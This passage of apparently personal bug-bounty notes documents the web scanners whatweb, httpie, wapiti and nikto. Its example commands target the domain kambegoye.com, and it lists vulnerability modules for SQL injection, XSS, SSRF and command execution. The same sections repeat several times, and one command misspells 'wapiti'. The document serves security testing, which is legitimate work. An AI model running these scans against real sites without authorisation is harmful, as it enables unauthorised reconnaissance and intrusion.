- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

#